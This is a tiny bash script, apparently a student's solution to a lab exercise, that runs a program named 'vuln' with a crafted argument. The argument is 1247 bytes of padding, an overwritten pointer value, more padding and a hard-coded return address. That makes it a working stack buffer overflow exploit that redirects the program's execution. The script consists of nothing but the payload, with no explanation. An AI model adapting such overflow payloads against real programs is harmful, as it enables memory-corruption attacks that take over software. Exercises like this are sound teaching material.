#!/usr/bin/env bash
/task2/s1976502/vuln "$(python -c "print('c'*1247 + '\x02\xc9\xff\xff' + 'c'*24 + '\x36\x92\x04\x08')")
"

